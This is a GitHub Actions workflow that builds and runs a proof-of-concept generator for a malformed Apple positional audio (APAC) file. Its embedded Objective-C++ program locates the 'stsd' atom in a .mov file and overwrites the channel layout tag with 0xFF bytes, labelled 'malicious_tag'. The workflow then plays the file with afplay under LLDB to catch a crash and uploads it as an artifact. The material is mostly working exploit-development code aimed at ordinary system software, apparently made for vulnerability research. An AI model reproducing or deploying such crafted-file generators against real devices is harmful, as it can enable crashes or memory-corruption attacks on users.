name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: This script now also dumps the MOV file's atom structure for debugging.
      - name: Patch encodeme.mm to Dump and Corrupt the APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm with recursive parser and dumper..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <stdio.h>
          #include <string.h>
          #include <sys/types.h>

          // Helper function to read a 32-bit big-endian integer from a file
          uint32_t read_uint32_be(FILE *f) {
              unsigned char bytes[4];
              if (fread(bytes, 1, 4, f) != 4) return 0;
              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
          }
          
          // New: Recursive function to dump the entire atom structure
          void dump_atoms(FILE *f, int depth, long parent_size) {
              long parent_start = ftell(f) - 8; // Adjust for atom header already read

              while (ftell(f) < parent_start + parent_size) {
                  long atom_start = ftell(f);
                  uint32_t atom_size = read_uint32_be(f);
                  char name[5] = {0};
                  if (fread(name, 1, 4, f) != 4) break;

                  for (int i = 0; i < depth; i++) printf("  ");
                  printf("Atom: '%s', Size: %u, Offset: 0x%lx\n", name, atom_size, atom_start);

                  // These are known container atoms, so we recurse into them
                  if (strcmp(name, "moov") == 0 || strcmp(name, "trak") == 0 || strcmp(name, "mdia") == 0 || strcmp(name, "minf") == 0 || strcmp(name, "stbl") == 0) {
                      dump_atoms(f, depth + 1, atom_size);
                  }

                  if (atom_size == 0) break;
                  fseek(f, atom_start + atom_size, SEEK_SET);
              }
          }


          // Recursive helper function to find a nested atom
          long find_atom_recursive(FILE *f, const char *atom_path) {
              char target_atom[5] = {0};
              const char *next_path = NULL;
              const char *separator = strchr(atom_path, '/');
              if (separator) {
                  strncpy(target_atom, atom_path, separator - atom_path);
                  next_path = separator + 1;
              } else {
                  strncpy(target_atom, atom_path, 4);
              }

              long parent_start = ftell(f);
              fseek(f, 0, SEEK_END);
              long file_size = ftell(f);
              fseek(f, parent_start, SEEK_SET);

              while (ftell(f) < file_size) {
                  long atom_start = ftell(f);
                  uint32_t atom_size = read_uint32_be(f);
                  char name[5] = {0};
                  if (fread(name, 1, 4, f) != 4) break;

                  if (strcmp(name, target_atom) == 0) {
                      if (next_path) {
                          // This is a container atom, recurse into it
                          return find_atom_recursive(f, next_path);
                      } else {
                          // This is the final atom we were looking for
                          return atom_start;
                      }
                  }
                  
                  if (atom_size == 0) break;
                  fseek(f, atom_start + atom_size, SEEK_SET);
              }
              return -1;
          }

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting file corruption at %s\n", ctime(&startTime));

                  const char* baseName = "IMG_1027.mov";
                  const char* pocName = "output_apac_poc.m4a";

                  // Step 1: Copy the base file.
                  NSError *error = nil;
                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName]
                                                               toPath:[NSString stringWithUTF8String:pocName] error:&error]) {
                      fprintf(stderr, "Failed to copy base file: %s\n", [[error localizedDescription] UTF8String]);
                      return 1;
                  }
                  fprintf(stderr, "Successfully copied base APAC file.\n");

                  // Step 2: Open the file to dump and then corrupt.
                  FILE *file = fopen(pocName, "r+b");
                  if (!file) {
                      fprintf(stderr, "Failed to re-open file for corruption.\n");
                      return 1;
                  }
                  
                  // Step 2a: Dump the atom structure for debugging
                  fprintf(stderr, "--- Atom Structure Dump ---\n");
                  fseek(file, 0, SEEK_END);
                  long file_size = ftell(file);
                  fseek(file, 0, SEEK_SET);
                  dump_atoms(file, 0, file_size);
                  fprintf(stderr, "--- End Atom Structure Dump ---\n");
                  
                  // Step 2b: Find the 'stsd' atom to corrupt.
                  fseek(file, 0, SEEK_SET); // Reset file pointer before searching
                  long stsd_offset = find_atom_recursive(file, "moov/trak/mdia/minf/stbl/stsd");
                  
                  if (stsd_offset == -1) {
                      fprintf(stderr, "Could not find the 'stsd' atom. The file structure may be unexpected.\n");
                      fclose(file);
                      return 1;
                  }
                  fprintf(stderr, "Found 'stsd' atom at offset: 0x%lx\n", stsd_offset);

                  // Step 3: Corrupt the channel layout tag
                  long corruption_offset = stsd_offset + 72;
                  fseek(file, corruption_offset, SEEK_SET);
                  
                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                  fclose(file);

                  fprintf(stderr, "PoC: Manually corrupted data at offset 0x%lx in the APAC file.\n", corruption_offset);
                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the corruption utility
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm utility..."
          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_corruptor
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This step now dumps the atom structure and corrupts the file.
      - name: Dump and Corrupt APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          # Redirect stderr to a log file to capture the atom dump
          ./encodeme_corruptor 2> atom_dump.txt
          echo "Malicious APAC PoC file generated."
          ls -l output_apac_poc.m4a
          echo "--- Atom Dump Log ---"
          cat atom_dump.txt
          
      # Launch the player directly under LLDB to catch any startup crashes.
      - name: Launch Player Under LLDB to Catch Crash
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with final PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will automatically stop if a crash occurs.
          run
          # If a crash occurred, this will give us the full backtrace.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.txt
          retention-days: 7
          if-no-files-found: error
